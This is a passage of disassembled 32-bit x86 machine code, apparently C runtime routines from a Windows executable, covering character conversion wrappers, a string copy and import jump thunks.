  40a542:	mov    ecx,ebp
  40a544:	shl    edi,cl
  40a546:	or     edi,edx
  40a548:	mov    DWORD PTR [esp],edi
  40a54b:	fld    QWORD PTR [esp]
  40a54e:	add    esp,0x14
  40a551:	pop    ebx
  40a552:	pop    esi
  40a553:	pop    edi
  40a554:	pop    ebp
  40a555:	ret    
  40a556:	lea    esi,[esi+0x0]
  40a559:	lea    edi,[edi+eiz*1+0x0]
  40a560:	sub    eax,0xb
  40a563:	mov    ebp,eax
  40a565:	je     0x40a582
  40a567:	mov    ecx,ebp
  40a569:	mov    DWORD PTR [esp],0x0
  40a570:	xor    edi,edi
  40a572:	shl    edx,cl
  40a574:	or     edx,0x3ff00000
  40a57a:	mov    DWORD PTR [esp+0x4],edx
  40a57e:	xor    edx,edx
  40a580:	jmp    0x40a542
  40a582:	xor    edi,edi
  40a584:	or     edx,0x3ff00000
  40a58a:	mov    DWORD PTR [esp],edi
  40a58d:	mov    DWORD PTR [esp+0x4],edx
  40a591:	fld    QWORD PTR [esp]
  40a594:	add    esp,0x14
  40a597:	pop    ebx
  40a598:	pop    esi
  40a599:	pop    edi
  40a59a:	pop    ebp
  40a59b:	ret    
  40a59c:	lea    esi,[esi+eiz*1+0x0]
  40a5a0:	push   ebp
  40a5a1:	push   edi
  40a5a2:	push   esi
  40a5a3:	push   ebx
  40a5a4:	sub    esp,0x1c
  40a5a7:	mov    DWORD PTR [esp],0x1
  40a5ae:	mov    edi,DWORD PTR [esp+0x30]
  40a5b2:	mov    esi,DWORD PTR [esp+0x34]
  40a5b6:	call   0x409c10
  40a5bb:	test   eax,eax
  40a5bd:	je     0x40a685
  40a5c3:	mov    ebx,esi
  40a5c5:	and    esi,0x7fffffff
  40a5cb:	and    ebx,0xfffff
  40a5d1:	mov    edx,esi
  40a5d3:	mov    ecx,ebx
  40a5d5:	shr    edx,0x14
  40a5d8:	or     ecx,0x100000
  40a5de:	test   edx,edx
  40a5e0:	cmovne ebx,ecx
  40a5e3:	test   edi,edi
  40a5e5:	jne    0x40a625
  40a5e7:	tzcnt  ecx,ebx
  40a5eb:	mov    DWORD PTR [eax+0x10],0x1
  40a5f2:	shr    ebx,cl
  40a5f4:	test   edx,edx
  40a5f6:	lea    esi,[ecx+0x20]
  40a5f9:	mov    DWORD PTR [eax+0x14],ebx
  40a5fc:	mov    ebx,0x1
  40a601:	je     0x40a657
  40a603:	mov    edi,DWORD PTR [esp+0x38]
  40a607:	lea    edx,[esi+edx*1-0x433]
  40a60e:	mov    DWORD PTR [edi],edx
  40a610:	mov    edi,DWORD PTR [esp+0x3c]
  40a614:	mov    edx,0x35
  40a619:	sub    edx,esi
  40a61b:	mov    DWORD PTR [edi],edx
  40a61d:	add    esp,0x1c
  40a620:	pop    ebx
  40a621:	pop    esi
  40a622:	pop    edi
  40a623:	pop    ebp
  40a624:	ret    
  40a625:	tzcnt  esi,edi
  40a629:	mov    ecx,esi
  40a62b:	shr    edi,cl
  40a62d:	test   esi,esi
  40a62f:	je     0x40a680
  40a631:	mov    ecx,0x20
  40a636:	mov    ebp,ebx
  40a638:	sub    ecx,esi
  40a63a:	shl    ebp,cl
  40a63c:	mov    ecx,esi
  40a63e:	or     edi,ebp
  40a640:	shr    ebx,cl
  40a642:	mov    DWORD PTR [eax+0x14],edi
  40a645:	cmp    ebx,0x1
  40a648:	mov    DWORD PTR [eax+0x18],ebx
  40a64b:	sbb    ebx,ebx
  40a64d:	add    ebx,0x2
  40a650:	test   edx,edx
  40a652:	mov    DWORD PTR [eax+0x10],ebx
  40a655:	jne    0x40a603
  40a657:	bsr    edx,DWORD PTR [eax+ebx*4+0x10]
  40a65c:	mov    edi,DWORD PTR [esp+0x38]
  40a660:	sub    esi,0x432
  40a666:	shl    ebx,0x5
  40a669:	mov    DWORD PTR [edi],esi
  40a66b:	mov    edi,DWORD PTR [esp+0x3c]
  40a66f:	xor    edx,0x1f
  40a672:	sub    ebx,edx
  40a674:	mov    DWORD PTR [edi],ebx
  40a676:	add    esp,0x1c
  40a679:	pop    ebx
  40a67a:	pop    esi
  40a67b:	pop    edi
  40a67c:	pop    ebp
  40a67d:	ret    
  40a67e:	xchg   ax,ax
  40a680:	mov    DWORD PTR [eax+0x14],edi
  40a683:	jmp    0x40a645
  40a685:	xor    eax,eax
  40a687:	jmp    0x40a61d
  40a689:	lea    esi,[esi+eiz*1+0x0]
  40a690:	mov    ecx,DWORD PTR [esp+0x8]
  40a694:	mov    eax,DWORD PTR [esp+0x4]
  40a698:	lea    edx,[ecx+0x1]
  40a69b:	movzx  ecx,BYTE PTR [ecx]
  40a69e:	test   cl,cl
  40a6a0:	mov    BYTE PTR [eax],cl
  40a6a2:	je     0x40a6b4
  40a6a4:	add    edx,0x1
  40a6a7:	movzx  ecx,BYTE PTR [edx-0x1]
  40a6ab:	add    eax,0x1
  40a6ae:	test   cl,cl
  40a6b0:	mov    BYTE PTR [eax],cl
  40a6b2:	jne    0x40a6a4
  40a6b4:	repz ret 
  40a6b6:	nop
  40a6b7:	nop
  40a6b8:	nop
  40a6b9:	nop
  40a6ba:	nop
  40a6bb:	nop
  40a6bc:	nop
  40a6bd:	nop
  40a6be:	nop
  40a6bf:	nop
  40a6c0:	push   esi
  40a6c1:	push   ebx
  40a6c2:	sub    esp,0x34
  40a6c5:	mov    ebx,DWORD PTR [esp+0x44]
  40a6c9:	mov    esi,DWORD PTR [esp+0x4c]
  40a6cd:	test   ebx,ebx
  40a6cf:	je     0x40a810
  40a6d5:	mov    ecx,DWORD PTR [esp+0x48]
  40a6d9:	test   ecx,ecx
  40a6db:	je     0x40a820
  40a6e1:	mov    eax,DWORD PTR [esi]
  40a6e3:	mov    DWORD PTR [esi],0x0
  40a6e9:	mov    DWORD PTR [esp+0x2c],eax
  40a6ed:	movzx  eax,BYTE PTR [ebx]
  40a6f0:	test   al,al
  40a6f2:	je     0x40a791
  40a6f8:	cmp    DWORD PTR [esp+0x54],0x1
  40a6fd:	jbe    0x40a774
  40a6ff:	cmp    BYTE PTR [esp+0x2c],0x0
  40a704:	jne    0x40a7a2
  40a70a:	mov    DWORD PTR [esp+0x4],eax
  40a70e:	mov    eax,DWORD PTR [esp+0x50]
  40a712:	mov    DWORD PTR [esp],eax
  40a715:	call   DWORD PTR ds:0x4112d0
  40a71b:	sub    esp,0x8
  40a71e:	test   eax,eax
  40a720:	je     0x40a774
  40a722:	cmp    DWORD PTR [esp+0x48],0x1
  40a727:	jbe    0x40a83f
  40a72d:	mov    eax,DWORD PTR [esp+0x40]
  40a731:	mov    DWORD PTR [esp+0x14],0x1
  40a739:	mov    DWORD PTR [esp+0xc],0x2
  40a741:	mov    DWORD PTR [esp+0x8],ebx
  40a745:	mov    DWORD PTR [esp+0x10],eax
  40a749:	mov    eax,DWORD PTR [esp+0x50]
  40a74d:	mov    DWORD PTR [esp+0x4],0x8
  40a755:	mov    DWORD PTR [esp],eax
  40a758:	call   DWORD PTR ds:0x4112e4
  40a75e:	sub    esp,0x18
  40a761:	test   eax,eax
  40a763:	je     0x40a82a
  40a769:	add    esp,0x34
  40a76c:	mov    eax,0x2
  40a771:	pop    ebx
  40a772:	pop    esi
  40a773:	ret    
  40a774:	mov    eax,DWORD PTR [esp+0x50]
  40a778:	test   eax,eax
  40a77a:	jne    0x40a7d0
  40a77c:	movzx  eax,BYTE PTR [ebx]
  40a77f:	mov    edx,DWORD PTR [esp+0x40]
  40a783:	mov    WORD PTR [edx],ax
  40a786:	add    esp,0x34
  40a789:	mov    eax,0x1
  40a78e:	pop    ebx
  40a78f:	pop    esi
  40a790:	ret    
  40a791:	mov    eax,DWORD PTR [esp+0x40]
  40a795:	xor    edx,edx
  40a797:	mov    WORD PTR [eax],dx
  40a79a:	xor    eax,eax
  40a79c:	add    esp,0x34
  40a79f:	pop    ebx
  40a7a0:	pop    esi
  40a7a1:	ret    
  40a7a2:	mov    BYTE PTR [esp+0x2d],al
  40a7a6:	mov    eax,DWORD PTR [esp+0x40]
  40a7aa:	mov    DWORD PTR [esp+0x14],0x1
  40a7b2:	mov    DWORD PTR [esp+0xc],0x2
  40a7ba:	mov    DWORD PTR [esp+0x10],eax
  40a7be:	lea    eax,[esp+0x2c]
  40a7c2:	mov    DWORD PTR [esp+0x8],eax
  40a7c6:	jmp    0x40a749
  40a7c8:	nop
  40a7c9:	lea    esi,[esi+eiz*1+0x0]
  40a7d0:	mov    eax,DWORD PTR [esp+0x40]
  40a7d4:	mov    DWORD PTR [esp+0x14],0x1
  40a7dc:	mov    DWORD PTR [esp+0xc],0x1
  40a7e4:	mov    DWORD PTR [esp+0x8],ebx
  40a7e8:	mov    DWORD PTR [esp+0x4],0x8
  40a7f0:	mov    DWORD PTR [esp+0x10],eax
  40a7f4:	mov    eax,DWORD PTR [esp+0x50]
  40a7f8:	mov    DWORD PTR [esp],eax
  40a7fb:	call   DWORD PTR ds:0x4112e4
  40a801:	sub    esp,0x18
  40a804:	test   eax,eax
  40a806:	je     0x40a82a
  40a808:	mov    eax,0x1
  40a80d:	jmp    0x40a79c
  40a80f:	nop
  40a810:	add    esp,0x34
  40a813:	xor    eax,eax
  40a815:	pop    ebx
  40a816:	pop    esi
  40a817:	ret    
  40a818:	nop
  40a819:	lea    esi,[esi+eiz*1+0x0]
  40a820:	mov    eax,0xfffffffe
  40a825:	jmp    0x40a79c
  40a82a:	call   0x40ad60
  40a82f:	mov    DWORD PTR [eax],0x2a
  40a835:	mov    eax,0xffffffff
  40a83a:	jmp    0x40a79c
  40a83f:	movzx  eax,BYTE PTR [ebx]
  40a842:	mov    BYTE PTR [esi],al
  40a844:	mov    eax,0xfffffffe
  40a849:	jmp    0x40a79c
  40a84e:	xchg   ax,ax
  40a850:	push   edi
  40a851:	push   esi
  40a852:	xor    eax,eax
  40a854:	push   ebx
  40a855:	sub    esp,0x30
  40a858:	mov    ebx,DWORD PTR [esp+0x40]
  40a85c:	mov    WORD PTR [esp+0x2e],ax
  40a861:	lea    eax,[esp+0x2e]
  40a865:	mov    esi,DWORD PTR [esp+0x4c]
  40a869:	test   ebx,ebx
  40a86b:	cmove  ebx,eax
  40a86e:	mov    eax,ds:0x411328
  40a873:	mov    edi,DWORD PTR [eax]
  40a875:	call   0x40af60
  40a87a:	mov    DWORD PTR [esp+0x10],eax
  40a87e:	mov    eax,DWORD PTR [esp+0x48]
  40a882:	test   esi,esi
  40a884:	mov    edx,0x410088
  40a889:	mov    DWORD PTR [esp+0x14],edi
  40a88d:	mov    DWORD PTR [esp],ebx
  40a890:	cmove  esi,edx
  40a893:	mov    DWORD PTR [esp+0x8],eax
  40a897:	mov    eax,DWORD PTR [esp+0x44]
  40a89b:	mov    DWORD PTR [esp+0xc],esi
  40a89f:	mov    DWORD PTR [esp+0x4],eax
  40a8a3:	call   0x40a6c0
  40a8a8:	add    esp,0x30
  40a8ab:	pop    ebx
  40a8ac:	pop    esi
  40a8ad:	pop    edi
  40a8ae:	ret    
  40a8af:	nop
  40a8b0:	push   ebp
  40a8b1:	push   edi
  40a8b2:	mov    eax,0x410084
  40a8b7:	push   esi
  40a8b8:	push   ebx
  40a8b9:	sub    esp,0x4c
  40a8bc:	mov    edx,DWORD PTR [esp+0x6c]
  40a8c0:	mov    esi,DWORD PTR [esp+0x64]
  40a8c4:	mov    ebp,DWORD PTR [esp+0x60]
  40a8c8:	mov    edi,DWORD PTR [esp+0x68]
  40a8cc:	test   edx,edx
  40a8ce:	cmovne eax,DWORD PTR [esp+0x6c]
  40a8d3:	mov    DWORD PTR [esp+0x6c],eax
  40a8d7:	call   0x40af60
  40a8dc:	mov    DWORD PTR [esp+0x28],eax
  40a8e0:	mov    eax,ds:0x411328
  40a8e5:	test   esi,esi
  40a8e7:	mov    eax,DWORD PTR [eax]
  40a8e9:	mov    DWORD PTR [esp+0x2c],eax
  40a8ed:	je     0x40a9f0
  40a8f3:	mov    ecx,DWORD PTR [esi]
  40a8f5:	test   ecx,ecx
  40a8f7:	je     0x40a9f0
  40a8fd:	test   ebp,ebp
  40a8ff:	je     0x40a980
  40a901:	xor    ebx,ebx
  40a903:	test   edi,edi
  40a905:	je     0x40a9f0
  40a90b:	mov    DWORD PTR [esp+0x64],esi
  40a90f:	mov    esi,ebp
  40a911:	mov    ebp,DWORD PTR [esp+0x64]
  40a915:	jmp    0x40a935
  40a917:	mov    esi,esi
  40a919:	lea    edi,[edi+eiz*1+0x0]
  40a920:	mov    ecx,DWORD PTR [ebp+0x0]
  40a923:	add    ebx,eax
  40a925:	add    esi,0x2
  40a928:	add    ecx,eax
  40a92a:	cmp    edi,ebx
  40a92c:	mov    DWORD PTR [ebp+0x0],ecx
  40a92f:	jbe    0x40a9e0
  40a935:	mov    eax,DWORD PTR [esp+0x2c]
  40a939:	mov    DWORD PTR [esp+0x4],ecx
  40a93d:	mov    DWORD PTR [esp],esi
  40a940:	mov    DWORD PTR [esp+0x14],eax
  40a944:	mov    eax,DWORD PTR [esp+0x28]
  40a948:	mov    DWORD PTR [esp+0x10],eax
  40a94c:	mov    eax,DWORD PTR [esp+0x6c]
  40a950:	mov    DWORD PTR [esp+0xc],eax
  40a954:	mov    eax,edi
  40a956:	sub    eax,ebx
  40a958:	mov    DWORD PTR [esp+0x8],eax
  40a95c:	call   0x40a6c0
  40a961:	cmp    eax,0x0
  40a964:	jg     0x40a920
  40a966:	jne    0x40a9e0
  40a968:	cmp    ebx,edi
  40a96a:	jae    0x40a9e0
  40a96c:	mov    DWORD PTR [ebp+0x0],0x0
  40a973:	add    esp,0x4c
  40a976:	mov    eax,ebx
  40a978:	pop    ebx
  40a979:	pop    esi
  40a97a:	pop    edi
  40a97b:	pop    ebp
  40a97c:	ret    
  40a97d:	lea    esi,[esi+0x0]
  40a980:	xor    eax,eax
  40a982:	xor    ebx,ebx
  40a984:	test   edi,edi
  40a986:	mov    WORD PTR [esp+0x3e],ax
  40a98b:	lea    ebp,[esp+0x3e]
  40a98f:	je     0x40a9e0
  40a991:	mov    DWORD PTR [esp+0x68],edi
  40a995:	mov    edi,esi
  40a997:	mov    esi,DWORD PTR [esp+0x2c]
  40a99b:	jmp    0x40a9ae
  40a99d:	lea    esi,[esi+0x0]
  40a9a0:	mov    ecx,DWORD PTR [edi]
  40a9a2:	add    ebx,eax
  40a9a4:	add    ecx,eax
  40a9a6:	cmp    DWORD PTR [esp+0x68],ebx
  40a9aa:	mov    DWORD PTR [edi],ecx
  40a9ac:	jbe    0x40a9e0
  40a9ae:	mov    eax,DWORD PTR [esp+0x28]
  40a9b2:	mov    DWORD PTR [esp+0x14],esi
  40a9b6:	mov    DWORD PTR [esp+0x8],esi
  40a9ba:	mov    DWORD PTR [esp+0x4],ecx
  40a9be:	mov    DWORD PTR [esp],ebp
  40a9c1:	mov    DWORD PTR [esp+0x10],eax
  40a9c5:	mov    eax,DWORD PTR [esp+0x6c]
  40a9c9:	mov    DWORD PTR [esp+0xc],eax
  40a9cd:	call   0x40a6c0
  40a9d2:	test   eax,eax
  40a9d4:	jg     0x40a9a0
  40a9d6:	lea    esi,[esi+0x0]
  40a9d9:	lea    edi,[edi+eiz*1+0x0]
  40a9e0:	add    esp,0x4c
  40a9e3:	mov    eax,ebx
  40a9e5:	pop    ebx
  40a9e6:	pop    esi
  40a9e7:	pop    edi
  40a9e8:	pop    ebp
  40a9e9:	ret    
  40a9ea:	lea    esi,[esi+0x0]
  40a9f0:	add    esp,0x4c
  40a9f3:	xor    eax,eax
  40a9f5:	pop    ebx
  40a9f6:	pop    esi
  40a9f7:	pop    edi
  40a9f8:	pop    ebp
  40a9f9:	ret    
  40a9fa:	lea    esi,[esi+0x0]
  40aa00:	push   esi
  40aa01:	push   ebx
  40aa02:	xor    eax,eax
  40aa04:	sub    esp,0x34
  40aa07:	mov    WORD PTR [esp+0x2e],ax
  40aa0c:	mov    eax,ds:0x411328
  40aa11:	mov    ebx,DWORD PTR [esp+0x48]
  40aa15:	mov    esi,DWORD PTR [eax]
  40aa17:	call   0x40af60
  40aa1c:	mov    DWORD PTR [esp+0x10],eax
  40aa20:	mov    eax,DWORD PTR [esp+0x44]
  40aa24:	test   ebx,ebx
  40aa26:	mov    edx,0x410080
  40aa2b:	mov    DWORD PTR [esp+0x14],esi
  40aa2f:	cmove  ebx,edx
  40aa32:	mov    DWORD PTR [esp+0x8],eax
  40aa36:	mov    eax,DWORD PTR [esp+0x40]
  40aa3a:	mov    DWORD PTR [esp+0xc],ebx
  40aa3e:	mov    DWORD PTR [esp+0x4],eax
  40aa42:	lea    eax,[esp+0x2e]
  40aa46:	mov    DWORD PTR [esp],eax
  40aa49:	call   0x40a6c0
  40aa4e:	add    esp,0x34
  40aa51:	pop    ebx
  40aa52:	pop    esi
  40aa53:	ret    
  40aa54:	nop
  40aa55:	nop
  40aa56:	nop
  40aa57:	nop
  40aa58:	nop
  40aa59:	nop
  40aa5a:	nop
  40aa5b:	nop
  40aa5c:	nop
  40aa5d:	nop
  40aa5e:	nop
  40aa5f:	nop
  40aa60:	sub    esp,0x4c
  40aa63:	mov    edx,DWORD PTR [esp+0x58]
  40aa67:	mov    eax,DWORD PTR [esp+0x54]
  40aa6b:	test   edx,edx
  40aa6d:	mov    WORD PTR [esp+0x2c],ax
  40aa72:	jne    0x40aa90
  40aa74:	cmp    ax,0xff
  40aa78:	ja     0x40aae8
  40aa7a:	mov    ecx,DWORD PTR [esp+0x50]
  40aa7e:	mov    BYTE PTR [ecx],al
  40aa80:	mov    eax,0x1
  40aa85:	add    esp,0x4c
  40aa88:	ret    
  40aa89:	lea    esi,[esi+eiz*1+0x0]
  40aa90:	lea    eax,[esp+0x3c]
  40aa94:	mov    DWORD PTR [esp+0x3c],0x0
  40aa9c:	mov    DWORD PTR [esp+0x18],0x0
  40aaa4:	mov    DWORD PTR [esp+0xc],0x1
  40aaac:	mov    DWORD PTR [esp+0x4],0x0
  40aab4:	mov    DWORD PTR [esp+0x1c],eax
  40aab8:	mov    eax,DWORD PTR [esp+0x5c]
  40aabc:	mov    DWORD PTR [esp],edx
  40aabf:	mov    DWORD PTR [esp+0x14],eax
  40aac3:	mov    eax,DWORD PTR [esp+0x50]
  40aac7:	mov    DWORD PTR [esp+0x10],eax
  40aacb:	lea    eax,[esp+0x2c]
  40aacf:	mov    DWORD PTR [esp+0x8],eax
  40aad3:	call   DWORD PTR ds:0x411310
  40aad9:	sub    esp,0x20
  40aadc:	test   eax,eax
  40aade:	je     0x40aae8
  40aae0:	mov    edx,DWORD PTR [esp+0x3c]
  40aae4:	test   edx,edx
  40aae6:	je     0x40aa85
  40aae8:	call   0x40ad60
  40aaed:	mov    DWORD PTR [eax],0x2a
  40aaf3:	mov    eax,0xffffffff
  40aaf8:	add    esp,0x4c
  40aafb:	ret    
  40aafc:	lea    esi,[esi+eiz*1+0x0]
  40ab00:	push   edi
  40ab01:	push   esi
  40ab02:	push   ebx
  40ab03:	sub    esp,0x20
  40ab06:	mov    ebx,DWORD PTR [esp+0x30]
  40ab0a:	lea    eax,[esp+0x1b]
  40ab0e:	mov    esi,DWORD PTR [esp+0x34]
  40ab12:	test   ebx,ebx
  40ab14:	movzx  esi,si
  40ab17:	cmove  ebx,eax
  40ab1a:	mov    eax,ds:0x411328
  40ab1f:	mov    edi,DWORD PTR [eax]
  40ab21:	call   0x40af60
  40ab26:	mov    DWORD PTR [esp+0x4],esi
  40ab2a:	mov    DWORD PTR [esp],ebx
  40ab2d:	mov    DWORD PTR [esp+0xc],edi
  40ab31:	mov    DWORD PTR [esp+0x8],eax
  40ab35:	call   0x40aa60
  40ab3a:	add    esp,0x20
  40ab3d:	pop    ebx
  40ab3e:	pop    esi
  40ab3f:	pop    edi
  40ab40:	ret    
  40ab41:	jmp    0x40ab50
  40ab43:	nop
  40ab44:	nop
  40ab45:	nop
  40ab46:	nop
  40ab47:	nop
  40ab48:	nop
  40ab49:	nop
  40ab4a:	nop
  40ab4b:	nop
  40ab4c:	nop
  40ab4d:	nop
  40ab4e:	nop
  40ab4f:	nop
  40ab50:	push   ebp
  40ab51:	push   edi
  40ab52:	push   esi
  40ab53:	push   ebx
  40ab54:	sub    esp,0x3c
  40ab57:	mov    ebx,DWORD PTR [esp+0x50]
  40ab5b:	call   0x40af60
  40ab60:	mov    DWORD PTR [esp+0x1c],eax
  40ab64:	mov    eax,ds:0x411328
  40ab69:	mov    ebp,DWORD PTR [eax]
  40ab6b:	mov    eax,DWORD PTR [esp+0x54]
  40ab6f:	mov    edi,DWORD PTR [eax]
  40ab71:	test   edi,edi
  40ab73:	je     0x40ac60
  40ab79:	test   ebx,ebx
  40ab7b:	je     0x40ac05
  40ab81:	mov    eax,DWORD PTR [esp+0x58]
  40ab85:	xor    esi,esi
  40ab87:	test   eax,eax
  40ab89:	je     0x40abd8
  40ab8b:	mov    eax,esi
  40ab8d:	mov    esi,edi
  40ab8f:	mov    edi,ebp
  40ab91:	mov    ebp,eax
  40ab93:	jmp    0x40aba8
  40ab95:	add    ebx,eax
  40ab97:	add    ebp,eax
  40ab99:	cmp    BYTE PTR [ebx-0x1],0x0
  40ab9d:	je     0x40abf0
  40ab9f:	add    esi,0x2
  40aba2:	cmp    DWORD PTR [esp+0x58],ebp
  40aba6:	jbe    0x40abd4
  40aba8:	mov    eax,DWORD PTR [esp+0x1c]
  40abac:	mov    DWORD PTR [esp+0xc],edi
  40abb0:	mov    DWORD PTR [esp+0x8],eax
  40abb4:	movzx  eax,WORD PTR [esi]
  40abb7:	mov    DWORD PTR [esp],ebx
  40abba:	mov    DWORD PTR [esp+0x4],eax
  40abbe:	call   0x40aa60
  40abc3:	test   eax,eax
  40abc5:	jg     0x40ab95
  40abc7:	mov    eax,0xffffffff
  40abcc:	add    esp,0x3c
  40abcf:	pop    ebx
  40abd0:	pop    esi
  40abd1:	pop    edi
  40abd2:	pop    ebp
  40abd3:	ret    
  40abd4:	mov    edi,esi
  40abd6:	mov    esi,ebp
  40abd8:	mov    eax,DWORD PTR [esp+0x54]
  40abdc:	mov    DWORD PTR [eax],edi
  40abde:	add    esp,0x3c
  40abe1:	mov    eax,esi
  40abe3:	pop    ebx
  40abe4:	pop    esi
  40abe5:	pop    edi
  40abe6:	pop    ebp
  40abe7:	ret    
  40abe8:	nop
  40abe9:	lea    esi,[esi+eiz*1+0x0]
  40abf0:	mov    eax,DWORD PTR [esp+0x54]
  40abf4:	mov    DWORD PTR [eax],0x0
  40abfa:	add    esp,0x3c
  40abfd:	lea    eax,[ebp-0x1]
  40ac00:	pop    ebx
  40ac01:	pop    esi
  40ac02:	pop    edi
  40ac03:	pop    ebp
  40ac04:	ret    
  40ac05:	mov    edx,DWORD PTR [esp+0x58]
  40ac09:	lea    esi,[esp+0x2b]
  40ac0d:	test   edx,edx
  40ac0f:	je     0x40ac6c
  40ac11:	mov    eax,ebx
  40ac13:	mov    ebx,edi
  40ac15:	mov    edi,eax
  40ac17:	jmp    0x40ac32
  40ac19:	lea    esi,[esi+eiz*1+0x0]
  40ac20:	add    edi,eax
  40ac22:	cmp    BYTE PTR [esp+eax*1+0x2a],0x0
  40ac27:	je     0x40ac73
  40ac29:	add    ebx,0x2
  40ac2c:	cmp    DWORD PTR [esp+0x58],edi
  40ac30:	jbe    0x40ac6a
  40ac32:	mov    eax,DWORD PTR [esp+0x1c]
  40ac36:	mov    DWORD PTR [esp+0xc],ebp
  40ac3a:	mov    DWORD PTR [esp+0x8],eax
  40ac3e:	movzx  eax,WORD PTR [ebx]
  40ac41:	mov    DWORD PTR [esp],esi
  40ac44:	mov    DWORD PTR [esp+0x4],eax
  40ac48:	call   0x40aa60
  40ac4d:	test   eax,eax
  40ac4f:	jg     0x40ac20
  40ac51:	jmp    0x40abc7
  40ac56:	lea    esi,[esi+0x0]
  40ac59:	lea    edi,[edi+eiz*1+0x0]
  40ac60:	add    esp,0x3c
  40ac63:	xor    eax,eax
  40ac65:	pop    ebx
  40ac66:	pop    esi
  40ac67:	pop    edi
  40ac68:	pop    ebp
  40ac69:	ret    
  40ac6a:	mov    ebx,edi
  40ac6c:	mov    eax,ebx
  40ac6e:	jmp    0x40abcc
  40ac73:	lea    eax,[edi-0x1]
  40ac76:	jmp    0x40abcc
  40ac7b:	nop
  40ac7c:	nop
  40ac7d:	nop
  40ac7e:	nop
  40ac7f:	nop
  40ac80:	jmp    DWORD PTR ds:0x4113dc
  40ac86:	nop
  40ac87:	nop
  40ac88:	jmp    DWORD PTR ds:0x4113d8
  40ac8e:	nop
  40ac8f:	nop
  40ac90:	jmp    DWORD PTR ds:0x4113d4
  40ac96:	nop
  40ac97:	nop
  40ac98:	jmp    DWORD PTR ds:0x4113d0
  40ac9e:	nop
  40ac9f:	nop
  40aca0:	jmp    DWORD PTR ds:0x4113cc
  40aca6:	nop
  40aca7:	nop
  40aca8:	jmp    DWORD PTR ds:0x4113c8
  40acae:	nop
  40acaf:	nop
  40acb0:	jmp    DWORD PTR ds:0x4113c4
  40acb6:	nop
  40acb7:	nop
  40acb8:	jmp    DWORD PTR ds:0x4113bc
  40acbe:	nop
  40acbf:	nop
  40acc0:	jmp    DWORD PTR ds:0x4113ac
  40acc6:	nop
  40acc7:	nop
  40acc8:	jmp    DWORD PTR ds:0x4113a8
  40acce:	nop
  40accf:	nop
  40acd0:	jmp    DWORD PTR ds:0x4113a4
  40acd6:	nop
  40acd7:	nop
  40acd8:	jmp    DWORD PTR ds:0x4113a0
  40acde:	nop
  40acdf:	nop
  40ace0:	jmp    DWORD PTR ds:0x411398
  40ace6:	nop
  40ace7:	nop
  40ace8:	jmp    DWORD PTR ds:0x411390
  40acee:	nop
  40acef:	nop
  40acf0:	jmp    DWORD PTR ds:0x41138c
  40acf6:	nop
  40acf7:	nop
  40acf8:	jmp    DWORD PTR ds:0x411388
  40acfe:	nop
  40acff:	nop
  40ad00:	jmp    DWORD PTR ds:0x411384
  40ad06:	nop
  40ad07:	nop
  40ad08:	jmp    DWORD PTR ds:0x411380
  40ad0e:	nop
  40ad0f:	nop
  40ad10:	jmp    DWORD PTR ds:0x41137c
  40ad16:	nop
  40ad17:	nop
  40ad18:	jmp    DWORD PTR ds:0x411378
  40ad1e:	nop
  40ad1f:	nop
  40ad20:	jmp    DWORD PTR ds:0x411374
  40ad26:	nop
  40ad27:	nop
  40ad28:	jmp    DWORD PTR ds:0x411370
  40ad2e:	nop
  40ad2f:	nop
  40ad30:	jmp    DWORD PTR ds:0x41136c
  40ad36:	nop
  40ad37:	nop
  40ad38:	jmp    DWORD PTR ds:0x411368
  40ad3e:	nop
  40ad3f:	nop
  40ad40:	jmp    DWORD PTR ds:0x411364
  40ad46:	nop
  40ad47:	nop
  40ad48:	jmp    DWORD PTR ds:0x411360
  40ad4e:	nop
  40ad4f:	nop
  40ad50:	jmp    DWORD PTR ds:0x411350
  40ad56:	nop
  40ad57:	nop
  40ad58:	jmp    DWORD PTR ds:0x411348
  40ad5e:	nop
  40ad5f:	nop
  40ad60:	jmp    DWORD PTR ds:0x411340
  40ad66:	nop
  40ad67:	nop
  40ad68:	jmp    DWORD PTR ds:0x41133c
  40ad6e:	nop
  40ad6f:	nop
  40ad70:	jmp    DWORD PTR ds:0x411338
  40ad76:	nop
  40ad77:	nop
  40ad78:	jmp    DWORD PTR ds:0x411330
  40ad7e:	nop
  40ad7f:	nop
  40ad80:	jmp    DWORD PTR ds:0x41132c
  40ad86:	nop
  40ad87:	nop
  40ad88:	jmp    DWORD PTR ds:0x41131c
  40ad8e:	nop
  40ad8f:	nop
  40ad90:	jmp    DWORD PTR ds:0x411318
  40ad96:	nop
  40ad97:	nop
  40ad98:	xchg   ax,ax
  40ad9a:	xchg   ax,ax
  40ad9c:	xchg   ax,ax
  40ad9e:	xchg   ax,ax
  40ada0:	mov    eax,ds:0x41008c
  40ada5:	ret    
  40ada6:	lea    esi,[esi+0x0]
  40ada9:	lea    edi,[edi+eiz*1+0x0]
  40adb0:	mov    eax,DWORD PTR [esp+0x4]
  40adb4:	xchg   DWORD PTR ds:0x41008c,eax
  40adba:	ret    
  40adbb:	nop
  40adbc:	nop
  40adbd:	nop
  40adbe:	nop
  40adbf:	nop
  40adc0:	mov    eax,ds:0x410090
  40adc5:	ret    
  40adc6:	lea    esi,[esi+0x0]
  40adc9:	lea    edi,[edi+eiz*1+0x0]
  40add0:	mov    eax,DWORD PTR [esp+0x4]
  40add4:	xchg   DWORD PTR ds:0x410090,eax
  40adda:	ret    
  40addb:	nop
  40addc:	lea    esi,[esi+eiz*1+0x0]
  40ade0:	push   ebx
  40ade1:	sub    esp,0x18
  40ade4:	mov    ebx,DWORD PTR [esp+0x20]
  40ade8:	mov    DWORD PTR [esp],0x40e200
  40adef:	call   DWORD PTR ds:0x4112a8
  40adf5:	sub    esp,0x4
  40adf8:	mov    DWORD PTR [esp+0x4],0x40e216
  40ae00:	mov    DWORD PTR [esp],eax
  40ae03:	call   DWORD PTR ds:0x4112ac
  40ae09:	mov    edx,0x40add0
  40ae0e:	sub    esp,0x8
  40ae11:	test   eax,eax
  40ae13:	cmove  eax,edx
  40ae16:	mov    DWORD PTR [esp+0x20],ebx
  40ae1a:	mov    ds:0x40c05c,eax
  40ae1f:	add    esp,0x18
  40ae22:	pop    ebx
  40ae23:	jmp    eax
  40ae25:	lea    esi,[esi+eiz*1+0x0]
  40ae29:	lea    edi,[edi+eiz*1+0x0]
  40ae30:	sub    esp,0x1c
  40ae33:	mov    DWORD PTR [esp],0x40e200
  40ae3a:	call   DWORD PTR ds:0x4112a8
  40ae40:	sub    esp,0x4
  40ae43:	mov    DWORD PTR [esp+0x4],0x40e229
  40ae4b:	mov    DWORD PTR [esp],eax
  40ae4e:	call   DWORD PTR ds:0x4112ac
  40ae54:	mov    edx,0x40adc0
  40ae59:	sub    esp,0x8
